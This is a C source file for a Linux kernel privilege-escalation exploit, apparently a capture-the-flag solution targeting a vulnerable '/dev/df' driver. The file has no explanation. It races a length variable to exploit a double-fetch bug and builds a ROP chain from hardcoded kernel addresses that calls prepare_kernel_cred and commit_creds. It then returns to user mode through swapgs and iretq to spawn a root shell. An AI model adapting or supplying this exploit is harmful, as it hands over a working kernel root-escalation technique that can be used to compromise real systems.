// gcc -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <pthread.h>

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;
int len = 32;

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
}

void shell() {
    execl("/bin/sh", "sh", NULL);
}

void *race(void) {
    while(1)
        len = sizeof(size_t)*30;
}

int main() {
    int fd;
    size_t rop[30] = {0, };
    pthread_t thread_t;
    int t_return;
    int count = 0;
    int i = 0;

    void *commit_creds = 0xffffffff8108e9f0;
    void *prepare_kernel_cred = 0xffffffff8108ec20;

    fd = open("/dev/df", O_RDWR);

    /* step 1 */
    backup_rv();

    i = 9;
    memset(rop, 0x41, 72);
    rop[i++] = 0xffffffff813fb9bc;    // pop rdi; ret;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = 0xffffffff813f4eca;    // pop rcx; ret;
    rop[i++] = 0;
    rop[i++] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;
    rop[i++] = commit_creds;
    rop[i++] = 0xffffffff81c00f58;   // swapgs; ret;
    rop[i++] = 0xffffffff810252b2;   // iretq; ret;
    rop[i++] = &shell;
    rop[i++] = rv.user_cs;
    rop[i++] = rv.user_rflags;
    rop[i++] = rv.user_rsp;
    rop[i++] = rv.user_ss;

    /* step 2 */
    pthread_create(&thread_t, NULL, race, NULL);

    /* step 3 */
    while(1) {
        write(fd, rop, &len);
        len = 32;

        count++;
        printf("df try count : %d\n", count);
    }

    pthread_join(thread_t, &t_return);

    close(fd);

    return 0;
}
